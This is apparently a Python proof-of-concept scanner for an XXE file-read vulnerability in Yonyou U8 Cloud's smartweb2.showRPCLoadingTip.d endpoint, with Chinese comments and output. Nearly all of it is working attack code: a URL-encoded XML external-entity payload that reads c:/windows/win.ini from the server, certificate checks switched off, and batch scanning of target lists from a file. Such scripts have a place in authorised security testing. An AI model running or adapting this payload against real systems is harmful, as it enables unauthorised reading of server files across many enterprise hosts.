#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略证书验证警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_xxe_file_read(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close'
    }

    data = '__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=%3C%21DOCTYPE+z+%5B%3C%21ENTITY+test++SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%5D%3E%3Crpc+transaction%3D%221%22+method%3D%22resetPwd%22%3E%3Cdef%3E%3Cdataset+type%3D%22Custom%22+id%3D%22dsResetPwd%22%3E%3Cf+name%3D%22user%22%3E%3C%2Ff%3E%3C%2Fdataset%3E%3C%2Fdef%3E%3Cdata%3E%3Crs+dataset%3D%22dsResetPwd%22%3E%3Cr+id%3D%221%22+state%3D%22insert%22%3E%3Cn%3E%3Cv%3E1%3C%2Fv%3E%3C%2Fn%3E%3C%2Fr%3E%3C%2Frs%3E%3C%2Fdata%3E%3Cvps%3E%3Cp+name%3D%22__profileKeys%22%3E%26test%3B%3C%2Fp%3E%3C%2Fvps%3E%3C%2Frpc%3E'

    try:
        response = requests.post(f"{url.rstrip('/')}/hrss/dorado/smartweb2%2eshowRPCLoadingTip%2ed?skin=default&__rpc=true&windows=1", headers=headers, data=data, verify=False, timeout=30)
        #print(response.text)
        if response.status_code == 200 and "fonts" in response.text:

            print(f"{RED}URL [{url}] 存在用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE读取文件漏洞{RESET}")
        else:
            print(f"URL [{url}] 可能不存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE读取文件漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_xxe_file_read(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_xxe_file_read(url)

if __name__ == '__main__':
    main()
